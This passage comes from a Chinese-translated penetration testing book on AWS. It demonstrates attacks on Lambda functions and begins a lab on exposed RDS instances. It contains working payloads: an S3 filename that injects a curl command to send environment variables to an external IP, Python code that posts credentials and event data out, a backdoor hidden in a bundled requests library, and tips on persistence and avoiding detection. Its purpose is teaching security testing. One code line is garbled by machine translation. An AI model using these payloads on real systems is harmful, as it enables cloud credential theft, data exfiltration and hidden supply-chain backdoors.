aws s3 cp ./'hello;curl -X POST -d "`env`" 1.1.1.1;.zip' s3://bucket-for-lambda-pentesting --profile LambdaReadOnlyTester

```

因为我们的恶意文件名，它看起来有点乱，但它所做的就是使用 S3 `copy` 命令作为`LambdaReadOnlyTester` AWS CLI 配置文件，将我们的本地恶意文件复制到`bucket-for-lambda-pentesting` S3 存储桶。执行此命令后，我们只需等待并观察我们的 NetCat 监听器，希望能获取一些凭据！几秒钟后，我们将看到以下内容：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/972de3e2-9dfb-48ed-8a9d-75616e094317.png)

来自 Lambda 服务器的所有环境变量都发送到我们的 NetCat 监听器

我们成功了！我们成功地通过一种有时被称为事件注入的方法，在运行 Lambda 函数的服务器上实现了代码执行，然后我们成功地将附加到该 Lambda 函数的角色的凭据外传到我们的外部服务器。现在，您可以将这些凭据用于您的 AWS CLI，并且继续前进并征服！

附加奖励：在撰写本文时，GuardDuty 的`UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration` 发现类型 ([`docs.aws.amazon.com/guardduty/latest/ug/guardduty_unauthorized.html#unauthorized11`](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_unauthorized.html#unauthorized11)) 不适用于从 Lambda 服务器中获取的凭据！

最后要注意的一点是，我们利用了一种事件注入方法来利用这个 Lambda 函数，但还有很多其他类型。您可以通过各种方法触发 Lambda 函数调用，例如前面提到的 DynamoDB 示例，或者可能是通过 CloudWatch Events 规则。您只需找出如何将自己的输入传递给函数以控制执行。使这一切变得最简单、最快速的方法是使用自定义测试事件（如果您拥有`"lambda:InvokeFunction"`权限），因为您可以在事件中指定您需要的确切载荷。

在入侵测试 Lambda 函数（带有读取访问权限）时需要记住的其他事项包括以下内容：

+   检查与每个函数相关联的标签，查看是否包含敏感信息。这种可能性非常小，但并非不可能。

+   正如我们之前讨论的，考虑将整个函数复制到你自己的 AWS 账户中进行测试，这样你就不需要在目标环境中制造噪音。

+   如果你有 CloudWatch 日志访问权限，请查看每个 Lambda 函数的执行日志，看看是否打印了任何敏感信息（存储在`"/aws/lambda/<function name>"`日志组中）。

+   你可以通过单击 AWS Web 控制台上的`"Actions"`下拉菜单，然后单击`"Export function"`，选择`"Download deployment package"`，来下载整个 Lambda 函数的`.zip`文件。然后，将其简单地移植到你自己的账户中。

+   尝试设计你的负载，使它们按照你的意愿执行而不会中断函数的执行。Lambda 函数执行出错可能会引起一些不必要的注意！

+   在编写负载时，要注意函数的超时。默认情况下，函数在三秒后超时，所以你需要一些快速、简单的外泄方式。

# 攻击具有读取和写入权限的 Lambda 函数

现在我们已经讨论了在你只有对 Lambda 的读取权限时攻击 Lambda 函数的方法，接下来我们将继续讨论读取和写入权限。在这种情况下，我们假设你作为攻击者拥有`"lambda:*"`权限，这基本上意味着你可以读取和写入任何内容，包括编辑现有函数、创建自己的函数、删除函数等。这开启了一个全新的攻击面，特别适合许多不同类型的攻击，尤其是权限提升、数据外泄和持久性。

对于这一部分，我们不会设置一个新的易受攻击函数，而是只使用我们之前设置的一些示例。

# 权限提升

通过 Lambda 函数进行权限提升相对容易，这取决于你遇到的设置。我们将看两种不同的情景：一种是你拥有`"lambda:*"`权限和`"iam:PassRole"`权限，另一种是仅具有`"lambda:*"`权限。

首先，我们假设除了完全的 Lambda 访问权限外，我们还拥有`"iam:PassRole"`权限。我们还假设我们可以列出 IAM 角色，但仅此而已（`iam:ListRoles`）。在这种情况下，我们的目标不一定需要积极使用 Lambda，我们就可以提升我们的权限。因为我们拥有 IAM `ListRoles` 权限，我们可以运行以下 AWS CLI 命令来查看账户中存在哪些 IAM 角色（确保指定你正在使用的正确配置文件）：

```

aws iam list-roles --profile LambdaReadWriteUser

```

你应该得到账户中每个角色及其`"AssumeRolePolicyDocument"`的列表。现在，我们可以通过这个列表筛选出 Lambda 可以承担的任何角色。以下是此响应中一个示例角色的样子（这是我们为我们的易受攻击函数创建的角色）：

```

{
    "Path": "/",
    "RoleName": "LambdaRoleForVulnerableFunction",
    "RoleId": "AROAIWA1V2TCA1TNPM9BL",
    "Arn": "arn:aws:iam::000000000000:role/LambdaRoleForVulnerableFunction",
    "CreateDate": "2018-12-19T21:01:17Z",
    "AssumeRolePolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Effect": "Allow",
                "Principal": {
                    "Service": "lambda.amazonaws.com"
                },
                "Action": "sts:AssumeRole
            }
        ]
    },
    "Description": "Allows Lambda functions to call AWS services on your behalf.",
    "MaxSessionDuration": 3600
}

```

我们可以看到，在`"AssumeRolePolicyDocument"`|`"Statement"` |`"Principal"`下指定了一个`"Service"`，它的值是`"lambda.amazonaws.com"`。这意味着 Lambda AWS 服务可以假定此角色并获取临时凭证。对于一个角色被附加到 Lambda 函数中，Lambda 必须能够承担这个角色。

现在，过滤掉角色列表，使得只剩下可以被 Lambda 承担的角色。同样，我们假定除了`ListRoles`和`PassRole`之外，我们没有任何更多的 IAM 权限，因此我们无法调查这些角色具有什么权限，我们最好的办法是尝试推断它们是用来与哪些服务一起工作的，根据它们的名称和描述。运行 IAM `ListRoles`时出现的一个角色的名称是`"LambdaEC2FullAccess"`，这清楚地说明了我们可以期待它具有的权限。EC2 是更有成效的服务之一，因此我们将针对我们的演示目标此角色。

在之前的章节中，我们看过 IAM `PassRole`权限，它允许我们将 IAM 角色“传递”给某个 AWS 资源，以便让它访问该角色的临时凭证。其中一个例子是将一个角色传递给 EC2 实例，这允许 EC2 服务访问该角色；我们甚至在本章早些时候将一个角色传递给我们易受攻击的 Lambda 函数。我们拥有对 Lambda 的完全访问权限和传递角色给 Lambda 函数的能力，这意味着我们基本上可以访问 Lambda 能够访问的任何角色。

这可以通过 AWS CLI 和 Lambda `CreateFunction` API 来完成，但我们将通过 AWS web 控制台来完成。首先，我们需要创建一个新的 Lambda 函数，给它起个名字（此演示中为`"Test"`），选择一个运行环境（再次选择`python3.7`），并在角色下拉菜单中选择`"Choose an existing role"`。然后，我们将从现有角色下拉菜单中选择`"LambdaEC2FullAccess"`，最后，点击`"Create function"`。

这一次，我们直接访问函数的代码，因此不需要提取或查看此角色的凭据。我们可以使用我们选择的编程语言的 AWS SDK 库，即 Python 的`boto3`库；它已包含在 Lambda 设置中，因此不需要将其作为函数的依赖项包括进来。现在，唯一剩下的就是决定如何使用我们获得访问权限的角色，根据名称，我们知道它具有`"EC2FullAccess"`权限，因此我们将导入`boto3`，创建一个 EC2 客户端，并调用 EC2 的`DescribeInstances`API。在 Python 中，这只需要几行代码，但我们需要格式化返回的 JSON 响应以便更容易阅读，因此我们还将使用 JSON 库。可以在这里看到：

```

import json
import boto3

def lambda_handler(event, context):
    ec2 = boto3.client('ec2')
    reservations = ec2.describe_instances())['Reservations']
    print(json.dumps(reservations, indent=2, default=str))

```

需要注意的是，我们不需要为`boto3`客户端指定凭据，因为如果我们没有明确传递任何内容，它将自动检查环境变量。这样，它将始终在 Lambda 函数中使用最新的凭据。

要执行该函数，我们需要创建一个测试事件，所以确保你点击橙色的保存按钮，然后直接点击左边的白色测试按钮：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/8791b537-b937-4c1d-bd9d-94989dd775fe.png)

创建我们的测试事件的测试按钮

应该会弹出一个屏幕来设置一个测试事件；我们不关心它如何配置，因为我们实际上并没有使用该事件。它只是通过 Web 控制台运行函数所需的。我们将选择`Hello World`事件模板（你可以选择任何内容），并将其命名为`Test`，然后点击屏幕右下角的`Create`按钮：  

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/f729d0b7-8abc-4ee0-9c7e-091c8dd3890f.png)

为我们的函数创建一个简单的测试事件

现在我们只需再次点击“测试”按钮，它将使用我们刚创建的测试事件来执行我们的函数。我们在`us-west-2`地区发现了一个单独的 EC2 实例（`AWS_REGION`环境变量会自动设置为我们 Lambda 函数所在的区域，所以`boto3`会使用它进行 API 调用）。我们可以在执行结果选项卡中看到这些结果，在函数执行后应该会弹出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/3a4a3d86-4795-4cc7-b300-20ece08b8c2e.png)

关于 us-west-2 中 EC2 实例的一小部分信息

这次测试成功了，所以很明显我们可以编写任何我们想要的代码，并指示 IAM 角色执行我们想要的操作。也许我们想要启动一堆 EC2 实例，或者我们想要尝试使用这个 EC2 访问权限进行进一步的利用，或者还有许多其他可能性。如果你没有 IAM 的`ListRoles`权限，你可以查看其他现有的 Lambda 函数来查看它们附加的角色，然后你可以尝试它们来查看你获得了什么样的访问权限。

对于我们的第二个场景，我们假设我们没有 IAM 的`PassRole`权限，这意味着我们无法创建一个新的 Lambda 函数，因为函数需要传递一个角色。为了利用这种情况，我们需要与现有的 Lambda 函数一起工作。对于这个演示，我们将针对我们在本章前面创建的`VulnerableFunction`进行目标定位。

在这种情况下，我们需要更加小心，因为我们不是在创建新的 Lambda 函数，而是在修改现有函数。 我们不想干扰环境中正在进行的任何操作，因为首先，作为渗透测试人员，我们尽量要避免这种情况，其次，我们不希望作为攻击者引起比必要更多的注意。 Lambda 函数突然停止工作会引起注意的人们的极大警惕。 我们可以确保这不会发生，方法是确保我们向函数添加的任何代码不会干扰其余的执行，这意味着我们需要捕获并消除我们附加的任何代码引发的任何错误。 另外，由于我们可能不知道函数是否会在其正常执行中早期出错，我们应该尽量将我们的代码放在执行的开始附近，以确保它得到执行。

回到我们之前创建的`VulnerableFunction`，我们知道附加到它的角色具有 S3 权限，因为函数代码与 S3 交互（而且我们自己设置了角色）。 为了从简单的地方开始，我们只是要列出账户中的 S3 存储桶，以查看我们可以使用哪些。 我们可以通过在`VulnerableFunction`中添加以下代码来完成此操作，在第 6 行之后（在调用`lambda_handler()`后，但在运行任何其他代码之前）：

```

try:
    s3 = boto3.client('s3')
    print(s3.list_buckets())
except:
    pass

```

我们甚至可以像以前一样进一步，导入 JSON 库并格式化输出，但最好尽量对现有函数进行尽可能少的更改。 我们使用`try`/`except`块来确保出现的任何错误不会中止函数的执行，并将`pass`放在 except 块中，我们可以确保错误会被静默地丢弃，然后函数将像往常一样执行。 `VulnerableFunction`的开头现在应该是这样的：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/e1d7eeef-e7aa-4212-9503-42aefa375920.png)

我们向`VulnerableFunction`添加了代码后的 VulnerableFunction 开头

这个载荷的唯一问题在于它假定我们可以查看此 Lambda 函数的执行日志，我们可能有或没有权限访问。 我们需要访问 CloudWatch 日志或能够使用测试事件运行函数，以便我们可以在 Web 控制台中查看输出。 现在我们会说我们没有 CloudWatch 访问权限，所以我们将使用测试事件。 下一个问题是，我们可能缺少围绕此 Lambda 函数的整个上下文。 我们不一定知道函数何时被调用是有意义的，函数何时会出错，它被调用的频率如何，如果在其正常触发器之外调用将会产生什么影响，以及许多其他问题。

要解决这个问题，我们可以选择忽略它，并针对函数运行测试事件，而不担心后果（这不是一个好主意，除非你非常确定它不会破坏环境中的任何东西，并且不会吸引防御者的不必要注意），或者我们可以修改我们的有效载荷来外泄凭证，有点像本章的第一节。这可能是最安全的方法，因为我们可以向函数添加我们的恶意有效载荷，在我们的外部服务器上设置监听器，然后只需等待 Lambda 函数被正常调用。为此，我们可以导入`subprocess`并像以前一样使用`curl`，但更简单的方法是使用 Python 的`requests`库。`Requests`不会自动包含在 Lambda 函数可用的默认库中，但是`botocore`会，而`botocore`依赖于`requests`库，因此我们可以使用一个很酷的技巧来导入和使用`requests`。我们使用以下`import`语句而不是`import requests`：

```

从 botocore.vendored 导入请求

```

现在，我们可以正常访问`requests`库了。因此，按照本章早期所做的类似方法，我们只需将所有环境变量发送到我们的外部服务器即可发送 HTTP `POST`请求。我们还可以在 Lambda 函数内部运行 AWS API 调用并外泄输出，这在技术上会更安全，因为 API 调用将来自预期的相同 IP 地址，而不是我们的外部攻击 IP；但是，拉取环境变量更加灵活，并且随着时间的推移需要对函数进行的修改较少，因此我们选择了这种方式。以下有效载荷将执行此操作（在这里我们假装`1.1.1.1`是我们外部服务器的 IP）：

```

try:
    import os
    from botocore.vendored import requests
    requests.post('http://1.1.1.1', json=os.environ.copy(), timeout=0.01)
except:
    pass
```

它使用`requests`库发送一个 HTTP `POST`请求，其中包含使用 OS 库获取的环境变量，并且将超时设置为`0.01`，以便发送请求；代码立即执行，而不是等待任何响应并导致 Lambda 函数本身超时。一旦将此有效载荷添加到目标 Lambda 函数中，我们只需等待函数通过正常手段被调用，最终我们将获得凭证发送到我们的服务器：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/286eb121-c4d3-46c6-ba28-336429a9dc39.png)

接收包含 Lambda 函数所有环境变量的 POST 请求

# 数据外泄

数据外泄很可能与我们之前提升权限的方式非常相似，即我们很可能编辑现有函数并从中外泄数据。我们可以通过多种不同的方式来实现这一点，其中一些列在这里：

+   修改现有函数并通过`"event"`和`"context"`参数外泄数据

+   创建一个新的函数和相关触发器来响应 AWS 环境中的某些事件，例如在第十一章中，*使用 Boto3 和 Pacu 来维持 AWS 持久性*，我们每次创建新用户时就将凭据外泄

+   修改现有函数，并将我们的外泄有效负荷放置在函数中间的某个位置，以外泄在函数正常执行期间被收集/修改的数据

这里还有许多其他攻击向量；你只需要有创造力。

如果我们只是想要我们的有效负荷外泄传递到 `"event"` 参数中的值，我们可以使用前一个有效负荷的略微修改版本：

```

try:
    from botocore.vendored import requests
    requests.post('http://1.1.1.1', json=event, timeout=0.01)
except:
    pass

```

确保注意 Lambda 函数的指定超时时间。你不希望你的外泄占用太长时间，以致 Lambda 函数超时并完全失败，因此，当通过 Lambda 外泄大量数据时，最好要么确保超时已经设置为很长的时间，要么自己去修改它以增加超时时间。问题在于，目标的 Lambda 账单会增加，因为它们的函数完成所需时间比正常情况下要长，这将引起注意。

# 持久性

我们不打算深入探讨持久性，因为我们在上一章已经涵盖了这一点，但是，和攻击 Lambda 的其他方法一样，持久性可以通过新的 Lambda 函数或编辑现有的 Lambda 函数来建立。持久性也可能意味着一些不同的事情。你想要对 Lambda 函数持久访问 bash shell，还是想要对 AWS 环境进行持久访问，或者两者都要？这完全取决于上下文和作为攻击者所处的情况最适用的是什么。甚至可能值得在多个 Lambda 函数中设置后门，以防其中一个被捕捉并被防御者移除。

# 保持潜伏

这是你可以发挥创造力的地方。显然，向发送数据到随机 IP 地址的函数中添加的随机代码将会引起熟悉该代码并重新审视它的任何人的怀疑。在这种情况下，捕捉到的指标可能甚至没有被捕捉到的提示，但是开发人员碰巧注意到 Lambda 函数中的这段奇怪的代码，并提出了一个问题，然后你被抓住了。如果在整个函数的开头放置恶意代码，那么这将会更明显，因此在代码的某处嵌套你的有效负荷将有所帮助。

将负载放置在入口函数（`lambda_handler()`）中不会改变任何内容，并且几乎不可能被人工审查/发现的地方怎么样？听起来好像太好了，但这不是真的！恶意黑客多年来一直在使用类似的技术，使其软件/硬件后门能够长时间保持活动状态，所以让我们将这种技术应用到 Lambda 中，并保持低调！

这种技术涉及到给 Lambda 函数依赖项设置后门。并非每一个你可能需要的库都包含在 Lambda 的基本库集中，就像我们在直接`import requests`时看到的那样，所以开发人员被迫自行收集这些依赖项，并将它们与其余的代码一起上传到 Lambda。我们将简要介绍一个简单示例。

假设我们无法通过`from botocore.vendored import requests`导入`requests`库，并且我们需要将该库包含在我们的 Lambda 代码中。可以通过将`requests`库与我们的基本 Lambda 代码一起包含，并将其上传为`.zip`文件到 Lambda 来解决这个问题。

对于这个示例，我们有一个`lambda_function.py`文件，导入了`requests`并向[`google.com/`](https://google.com/)发出请求，然后打印响应文本。`requests`库以其全部内容包含在旁边，以允许在以下截图中的第 2 行代码中使用`import requests`。`requests`库还需要`chardet`、`urllib3`、`idna`和`certify`库，因此这些也已被包含进来：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/0ed9d39c-4529-40a5-b318-752f416e69eb.png)

使用已包含请求库的示例 Lambda 函数

这个函数很短，所以在我们的攻击期间直接修改代码将对任何人都很明显，但因为它导入了`requests`库，而`requests`库源代码也在那里，所以那将是我们的目标。我们可以看到在第 4 行调用了`requests.get()`方法。如果我们在`requests`库的源代码中查找，我们可以找到`api.py`文件中的`requests.get()`方法，在此写作时位于第 63 行：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/292e3758-55b4-461a-b11a-ba9f58338ab2.png)

`requests.get()`方法的源代码

我们已经知道每次 Lambda 函数运行时都会调用这个方法，所以我们只需要直接修改它，而不是修改调用它的文件（`lambda_function.py`）。这次我们的负载需要有所不同，因为整个`requests`库并未直接导入到`requests`库的每个文件中，所以我们必须使用`"request"`方法，而不是`requests.post()`。我们的负载将如下所示：

```

try:
    data = {'url': url, 'params': params, **kwargs}
    requests('POST', 'http://1.1.1.1', json=data, timeout=0.01)
except:
pass
```

这个 payload 基本上只是在完成原始请求之前窃取到发送到我们自己服务器的每个请求的所有细节。我们可能能够截获一些敏感数据以利用我们自己的利益。我们可以将恶意的窃取 payload 直接放在`get`方法中，如下面的截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/30132e26-f6ca-417a-99b1-593714e5a6e2.png)

我们的 payload 放置在 requests.get() 方法中

即使看起来有点奇怪，很少有开发人员会想要审查他们包含的库的源代码，即使他们这样做了，他们也没有编写该库，因此它们可能不会被他们认为是奇怪的。现在，每当这个 Lambda 函数被调用时，`requests.get()` 方法将被调用，这意味着我们的 payload 将被执行，我们将窃取一些数据：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/bb406a51-c093-499e-86a9-96ad2b3c23ec.png)

从 Python 依赖中成功窃取

我们现在已经成功地从一个 Lambda 函数中窃取了信息，而不需要修改主函数的任何实际代码。这种攻击可以深入多个层次。如果主 Lambda 函数需要库 X，而库 X 中的方法需要库 Y，那么你可以一直倒退到库 Y。没有限制，只要你的方法以某种方式被调用。

在真实的攻击场景中，你所需要做的就是像我们之前做的那样将 Lambda 函数导出为一个 `.zip` 文件，进行修改，然后将其重新上传为该函数的最新版本。即使防御者看到函数被修改了，他们仍然可能永远找不到你实施的后门。

# 进入虚拟专用云

我们已经涵盖了许多关于攻击 Lambda 函数的内容，但在本节中，我们将讨论从访问 Lambda 函数到访问**虚拟专用云**（**VPC**）内部网络的转变。这是可能的，因为 Lambda 函数可以出于各种原因启动到 VPC 中。这为我们攻击者提供了具有与 Lambda 访问权限的能力来与我们可能无法获得访问权限的内部主机和服务进行交互的能力。

再次，我们可以从两个不同的角度来解决这个问题。如果我们有所需的权限，我们可以将一个新的 Lambda 函数启动到我们选择的 VPC 中，或者我们可以修改已经启动到 VPC 中的 Lambda 函数的代码。我们将运行一个演示，在其中我们将编辑一个已经启动到 VPC 中的函数。

对于这个演示，如果我们查看 Lambda Web UI 中的网络选项卡，我们可以看到这个函数已经启动到默认的 VPC 中，它在两个子网中，并且它在安全组 `sg-0e9c3b71` 中。我们还可以看到安全组允许从某个 IP 地址对端口 80 进行入站访问，并允许从同一安全组内的服务器访问所有端口：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/379e712a-23b8-492e-9ac0-c9e9b00a778e.png)

我们目标 Lambda 函数的网络设置

然后，我们将运行 EC2 `DescribeInstances` API 调用，以找出在这个 VPC 中存在哪些其他服务器。我们可以用以下 AWS CLI 命令来做到这一点：

```

aws ec2 describe-instances

```

或者，我们可以使用`"ec2__enum"` Pacu 模块。结果告诉我们有一个 EC2 实例，并且它与我们的 Lambda 函数属于相同的安全组：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/20938411-2a70-46c9-9939-9925406bc8eb.png)

与我们的 Lambda 函数属于相同安全组的一个 EC2 实例

基于我们在这个安全组的入站规则中看到的内容，我们知道我们的 Lambda 函数可以访问那个 EC2 实例上的每个端口。我们还知道，很可能有一些东西在`80`端口上被托管，因为相同的安全组将对端口`80`的访问权限白名单到了不同的 IP 地址。作为一个拥有少量 EC2 权限的攻击者，通常很难进入 VPC 的内部，但 Lambda 函数却让我们规避了这一点。我们只需要修改 Lambda 函数中的代码来在 VPC 的网络内部实现我们想要的功能。

我们将忽略目标 Lambda 函数中的任何代码，只专注于我们的负载，以访问内部网络。我们知道我们想要联系内部主机的`80`端口，这很可能意味着有一个运行的 HTTP 服务器，所以我们可以再次使用`requests`库向其发出请求。我们仍然不想中断任何生产代码，所以一切都将被包装在`try`/`except`块中，就像之前一样。刚才一分钟前的 EC2 `DescribeInstances`调用给我们了目标 EC2 实例的内部 IP 地址，是`172.31.32.192`。我们的负载将看起来像这样：

```
try:
    from botocore.vendored import requests
    req = requests.get('http://172.31.32.192/')
    print(req.text)
except:
    pass
```

为了简单起见，我们将只将输出打印到控制台并在那里查看，但这是另一种可能需要某种外泄的情况。但是，请确保您的 Lambda 函数具有 Internet 访问权限，因为当它们被启动到 VPC 中时，它们会失去默认的 Internet 访问权限，并依赖于 VPC 来提供该访问权限。

在运行有效负载以尝试向该内部 IP 发出 HTTP 请求后，我们在 Lambda 控制台中看到了以下内容：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/c8ed9d36-5578-42ed-8b50-ce50c7e375a8.png)

我们联系了内部服务器并收到了回应

就这样，我们可以看到，我们已经访问了内部网络，以绕过网络限制，并访问了我们正在攻击的公司的某种内部人力资源门户。在底部，我们甚至可以看到一张包含一些私人员工信息的表，例如他们的薪水。

这样就可以轻松地访问 AWS 网络的内部侧。这种方法可以用于各种不同的攻击，例如访问不公开可访问的 RDS 数据库，因为我们可以将 Lambda 函数启动到其所在的 VPC /子网中并与其进行连接。各种 AWS 服务都有将资源启动到私有 VPC 以禁用对其的公共访问的选项，而这种进入 VPC 内部的方法使我们能够访问所有这些不同的服务；其他一些示例包括`ElastiCache`数据库，EKS 集群等。

# 摘要

AWS Lambda 是一项非常多才多艺且有用的服务，既适用于 AWS 用户，也适用于攻击者。作为攻击者，我们可以利用 Lambda 的许多可能性，其中最好的一点是，我们的目标甚至不一定需要自己使用 Lambda，也可以使我们受益。

由于 Lambda 有许多不同的用例，它总是我们要检查的更高优先级服务之一，因为它通常会产生非常有益的攻击路径，使我们能够进一步访问 AWS 环境。还要记住的一件事是，与许多服务（包括 Lambda）一样，它们不断发展，打开和关闭不同的攻击路径，我们可以利用；保持最新和知识渊博非常重要，因为我们正在攻击的帐户将利用这些变化。


# 第十三章：渗透测试和保护 AWS RDS

AWS 关系数据库服务（RDS）通常托管与特定应用程序相关的最关键和敏感的数据。因此，有必要专注于识别暴露的 AWS RDS 实例以枚举访问，以及随后存储在数据库实例中的数据。本章重点介绍了在安全和不安全的方式下设置示例 RDS 实例并将其连接到 WordPress 实例的过程。除此之外，我们还将专注于获取对暴露数据库的访问权限，以及从该数据库中识别和提取敏感数据。

在本章中，我们将涵盖以下主题：

+   设置 RDS 实例并将其连接到 EC2 实例

+   使用 Nmap 识别和枚举暴露的 RDS 实例

+   从易受攻击的 RDS 实例中利用和提取数据

# 技术要求

本章将使用以下工具：

+   WordPress

+   Nmap

+   Hydra

# 设置一个易受攻击的 RDS 实例

我们将首先创建一个简单的 RDS 实例，然后将其连接到 EC2 机器：

1.  在服务菜单中，转到 Amazon RDS：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/b6f4b790-568c-49fb-b97f-0fce1154f5bb.png)

1.  点击“创建数据库”。对于本教程，我们将使用 MySQL；选择 MySQL，并点击“下一步”：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/be781ce6-4811-4cff-8412-723ef378bd92.png)

1.  由于这只是一个教程，我们将使用 Dev/Test – MySQL 选项。这是一个免费的层，因此不会收费。选择 Dev/Test – MySQL 并继续点击“下一步”：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/29659e8d-0dd7-4e38-8414-59a252b36feb.png)

1.  在下一页上，点击“仅启用符合 RDS 免费使用层条件的选项”。然后在 DB 实例类中选择 db.t2.micro 实例：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/37a6d7e2-a325-41ec-9a9c-e677da3d7fd0.png)

1.  填写以下截图中显示的细节，如 DB 名称、主用户名和主密码。对于本教程，我们将设置数据库易受暴力攻击；我们将其命名为`vulndb`，并将用户名和密码设置为`admin`和`password`：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/098fe6eb-5031-40dd-9cf7-4128cae3b832.png)

1.  在下一页上，将公开访问设置为“是”；其他一切保持不变。最后，点击“创建数据库”。

您的 DB 实例将很快创建。默认情况下，DB 实例将不对任何公共 IP 地址可访问。要更改此设置，请打开 RDS 实例的安全组，并允许从任何地方的端口`3306`上的传入连接。

1.  现在，我们将为我们的 WordPress 网站创建一个数据库。从终端连接到 RDS 实例：

```
mysql -h <<RDS Instance name>> -P 3306 -u admin -p
```

1.  在 MySQL shell 中，键入以下命令以创建新数据库：

```
CREATE DATABASE newblog;
GRANT ALL PRIVILEGES ON newblog.* TO 'admin'@'localhost' IDENTIFIED BY 'password';
FLUSH PRIVILEGES;
EXIT;
```

我们的数据库现在已经设置好了。在下一节中，我们将看看如何将我们新创建的数据库连接到 EC2 实例。

# 将 RDS 实例连接到 EC2 上的 WordPress

一旦我们的 RDS 实例创建完成，我们将在 EC2 实例上设置 WordPress。

对于本教程，我们将使用 Ubuntu 16.04 实例。继续，启动 Ubuntu EC2 实例。在入站规则设置中，确保允许流量到端口`80`和`443`（HTTP 和 HTTPS）：

1.  SSH 进入 Ubuntu 实例。我们现在将设置实例以能够托管 WordPress 网站。在继续之前，运行`apt update`和`apt upgrade`。

1.  在您的 EC2 机器上安装 Apache 服务器：

```
sudo apt-get install apache2 apache2-utils
```

1.  要启动 Apache 服务，可以运行以下命令：

```
sudo systemctl start apache2
```

要查看实例是否工作，可以访问`http://<<EC2 IP 地址>>`，您应该会看到 Apache 的默认页面。

1.  现在，我们将安装 PHP 和一些模块，以便它与 Web 和数据库服务器一起工作，使用以下命令：

```
sudo apt-get install php7.0 php7.0-mysql libapache2-mod-php7.0 php7.0-cli php7.0-cgi php7.0-gd  
```

1.  要测试 PHP 是否与 Web 服务器一起工作，我们需要在`/var/www/html`中创建`info.php`文件：

```
sudo nano /var/www/html/info.php
```

1.  将以下代码复制并粘贴到文件中，保存并退出：

```
<?php phpinfo(); ?>
```

完成后，打开您的 Web 浏览器，输入此地址：`http://<<EC2 IP 地址>>/info.php`。您应该能够查看以下 PHP 信息页面作为确认：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/9e90b3bf-0195-40d1-9ec4-7c8edcd6086f.png)

1.  接下来，我们将在我们的 EC2 机器上下载最新的 WordPress 网站：

```
wget -c http://wordpress.org/latest.tar.gz
tar -xzvf latest.tar.gz
```

1.  我们需要将从提取的文件夹中的所有 WordPress 文件移动到 Apache 默认目录：

```
sudo rsync -av wordpress/* /var/www/html/
```

1.  接下来，我们需要配置网站目录的权限，并将 WordPress 文件的所有权分配给 Web 服务器：

```
sudo chown -R www-data:www-data /var/www/html/
sudo chmod -R 755 /var/www/html/
```

现在我们将连接我们的 WordPress 网站到我们的 RDS 实例。

1.  转到`/var/www/html/`文件夹，并将`wp-config-sample.php`重命名为`wp-config.php`如下：

```
sudo mv wp-config-sample.php wp-config.php
```

1.  接下来，使用 RDS 实例的详细信息更新“MySQL 设置”部分。在上一节中，我们将数据库命名为`newblog`；因此，我们将在这里使用相同的名称：

```
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', <<database_name_here>>); /** MySQL database username */ define('DB_USER', <<username_here>>); /** MySQL database password */ define('DB_PASSWORD', <<password_here>>); /** MySQL hostname */ define('DB_HOST', <<RDS IP Address>>); /** Database Charset to use in creating database tables. */ define('DB_CHARSET', 'utf8'); /** The Database Collate type. Don't change this if in doubt. */ define('DB_COLLATE', '');
```

1.  保存文件，然后重新启动 Apache 服务器：

```
sudo systemctl restart apache2.service
```

1.  打开您的 Web 浏览器，然后输入`http://<<EC2 IP 地址>>/index.php`服务器地址以获取欢迎页面：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/3c6048dd-35e7-4b5a-85c3-b322e14b4b90.png)

1.  选择您喜欢的语言，然后点击继续。最后，点击“让我们开始”！

1.  填写所有请求的信息，然后设置您的用户名和密码。最后，点击安装 WordPress。

1.  完成后，您可以使用用户名和密码登录 WordPress 安装：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/0a2d20a5-0b6c-436d-a436-54dbbbd92d30.png)

我们的 WordPress 目标已经设定好。但是，我们将 RDS 实例留给整个互联网访问。这是一个易受攻击的配置。

在下一节中，我们将看到如何发现这样的易受攻击的 RDS 实例。

# 使用 Nmap 识别和枚举暴露的 RDS 实例

还记得我们将 RDS 实例设置为公开访问吗？现在是时候识别这些公共 RDS 实例并利用它们了。

在这种情况下，我们已经知道了我们的 RDS 实例的主机名，这使得对我们来说稍微容易一些。我们将从在我们的实例上运行`nmap`扫描开始，以确定哪些端口是打开的：

1.  SSH 进入您的 Kali 机器，并发出以下命令：

```
sudo nmap -sS -v -Pn <<RDS Instance>>
```

我们可以看到端口`3306`是打开的，并且正在监听任何传入的连接：

